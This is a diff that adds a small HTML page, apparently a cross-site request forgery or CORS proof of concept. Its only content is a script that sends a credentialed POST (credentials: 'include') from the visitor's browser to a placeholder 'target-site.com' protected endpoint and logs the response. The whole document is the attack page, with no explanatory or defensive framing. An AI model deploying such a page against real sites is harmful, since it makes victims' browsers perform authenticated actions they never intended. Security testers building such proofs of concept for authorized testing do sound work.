@@ -1,0 +1,10 @@
+<html>
+  <body>
+    <script>
+      fetch('https://target-site.com/protected-endpoint', {
+        method: 'POST',
+        credentials: 'include'
+      }).then(response => console.log(response));
+    </script>
+  </body>
+</html>
